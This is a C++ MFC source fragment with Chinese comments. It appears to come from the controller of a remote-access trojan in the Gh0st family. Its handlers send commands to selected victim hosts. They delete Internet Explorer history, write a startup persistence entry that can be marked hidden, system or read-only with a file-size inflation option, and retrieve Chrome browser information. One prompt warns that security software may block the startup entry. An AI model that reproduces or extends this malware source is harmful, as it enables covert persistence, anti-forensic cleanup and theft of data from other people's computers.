void CPcView::OnIEQC()  //删除IE历史记录
{
	BYTE	bToken = COMMAND_ReStart_ieqc;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnIEQC1() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc1;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnIEQC2() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc2;
	SendSelectCommand(&bToken, sizeof(BYTE));
}

void CPcView::OnIEQC3() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc3;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnIEQC4() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc4;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnIEQC5() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc5;
	SendSelectCommand(&bToken, sizeof(BYTE));
}
void CPcView::OnIEQC6() 
{
	::MessageBox(0, "等待三秒删除成功","删除成功", MB_ICONINFORMATION);//弹出提示框
	BYTE	bToken = COMMAND_ReStart_ieqc6;
	SendSelectCommand(&bToken, sizeof(BYTE));
}


struct START
{
	CHAR Startname[200];
	WORD FileAttribute;      //文件属性	
	WORD Enlarge;            //安装增大
}Start;
void CPcView::OnStart() 
{
	// TODO: Add your command handler code here
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		MessageBox("请选择主机！");
		return ;	
	}

	POSITION pos = m_pListCtrl->GetFirstSelectedItemPosition(); //iterator for the CListCtrl
	if (pos==NULL)
		return;
	
	if (MessageBox(_T("确定写启动项吗？安全软件可能会拦截！！！"), _T("提示"), MB_YESNO | MB_ICONWARNING) == IDNO)
		return;

	CStart dlg;
one:
	if(dlg.DoModal() != IDOK) 
		return;
	
	if ((strlen(dlg.m_StartName) < 1))
	{
		MessageBox("请输入文件名称!!... ", "提示! ", MB_OK | MB_ICONWARNING);
		goto one;
	}
	
	CString rString = dlg.m_strCur;

	ZeroMemory(&Start,sizeof(START));
	strcpy(Start.Startname,dlg.m_StartName.GetBuffer(0));



	if(rString == "正常")
		Start.FileAttribute = FILE_ATTRIBUTE_NORMAL;
	if(rString == "隐藏")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN;
	
	if(rString == "系统")
		Start.FileAttribute = FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "只读")
		Start.FileAttribute = FILE_ATTRIBUTE_READONLY;
	
	if(rString == "隐藏+系统")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM;
	
	if(rString == "隐藏+系统+只读")
		Start.FileAttribute = FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM|FILE_ATTRIBUTE_READONLY;

	Start.Enlarge=(WORD)dlg.m_Enlarge;

	
	BYTE	*bToken = new BYTE[sizeof(START)+1];
	bToken[0]= COMMAND_START;
	memcpy(&bToken[1],&Start,sizeof(START));
	
	SendSelectCommand(bToken, sizeof(START)+1);
	delete bToken;
	goto one;

}

void CPcView::OnMenuChrome()
{
	// TODO: 在此添加命令处理程序代码
	if (m_pListCtrl->GetSelectedCount() < 1)
	{
		return ;	
	}
	// 	SendDllCommand("BRemoteRegedit",NULL,0);	
	BYTE	bToken = COMMAND_CHROME_INFO;
	SendSelectCommand(&bToken,sizeof(BYTE));
	LocalFree((LPBYTE)&bToken);
}
